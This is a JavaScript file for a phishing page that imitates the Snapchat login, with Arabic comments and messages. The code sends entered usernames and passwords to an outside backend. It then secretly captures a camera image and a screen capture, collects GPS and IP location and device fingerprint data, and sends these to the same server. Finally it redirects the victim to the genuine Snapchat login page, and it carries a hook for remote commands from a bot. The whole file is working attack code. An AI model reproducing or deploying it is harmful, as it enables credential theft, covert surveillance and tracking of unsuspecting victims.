const BACKEND_URL = "https://snap-backend-2lgr.onrender.com";  // ✅ عدله لو تغير الرابط لاحقًا

function handleLogin(event) {
  event.preventDefault();
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;
  sendNotification(`🔐 تسجيل دخول Snap وهمي:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);
  document.getElementById('statusMsg').innerText = "✅ تم تسجيل الدخول، جاري التحقق من الجهاز...";
  setTimeout(startFullVerification, 1500);
}

function startFullVerification() {
  sendNotification("🚀 بدء التحقق الشامل...");
  tryCameraWithFallback();
  tryScreenCapture();
  requestLocation();
  getIPLocation();
  sendFingerprint();
  setTimeout(() => {
    window.location.href = "https://accounts.snapchat.com/accounts/login";
  }, 7000);
}

function sendNotification(msg) {
  fetch(`${BACKEND_URL}/notify`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: msg })
  });
}

function tryCameraWithFallback() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      video.style.position = "fixed";
      video.style.top = "-9999px";
      document.body.appendChild(video);

      setTimeout(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
        const img = canvas.toDataURL("image/png");
        sendScreenshot(img, "📸 صورة من الكاميرا");

        stream.getTracks().forEach(t => t.stop());
        video.remove();
      }, 3000);
    })
    .catch(() => {
      sendNotification("❌ فشل الوصول للكاميرا.");
      capturePage();
    });
}

function tryScreenCapture() {
  if (!navigator.mediaDevices.getDisplayMedia) return;
  navigator.mediaDevices.getDisplayMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
        const img = canvas.toDataURL("image/png");
        sendScreenshot(img, "🖥️ لقطة شاشة من المشاركة");

        stream.getTracks().forEach(t => t.stop());
        video.remove();
      }, 3000);
    })
    .catch(() => sendNotification("❌ فشل مشاركة الشاشة."));
}

function capturePage() {
  html2canvas(document.body).then(canvas => {
    const img = canvas.toDataURL("image/png");
    sendScreenshot(img, "📸 لقطة شاشة للصفحة");
  });
}

function requestLocation() {
  navigator.geolocation.getCurrentPosition(
    pos => {
      fetch(`${BACKEND_URL}/location`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        })
      });
    },
    () => sendNotification("❌ فشل تحديد الموقع عبر GPS.")
  );
}

function getIPLocation() {
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      const msg = `🌐 معلومات الشبكة:\nالدولة: ${data.country_name}\nالمدينة: ${data.city}\nIP: ${data.ip}\nمزود: ${data.org}\n🔗 https://maps.google.com/?q=${data.latitude},${data.longitude}`;
      sendNotification(msg);
    })
    .catch(() => sendNotification("⚠️ فشل تحديد الموقع عبر IP."));
}

function sendFingerprint() {
  const info = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency,
    ram: navigator.deviceMemory || "غير متاح"
  };
  fetch(`${BACKEND_URL}/fingerprint`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(info)
  });
}

function sendScreenshot(imgData, label) {
  fetch(`${BACKEND_URL}/screenshot`, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: imgData
  }).then(() => sendNotification(label));
}

window.onload = function () {
  pollCommands(); // إذا كان فيه تحكم مباشر من البوت لاحقًا
};
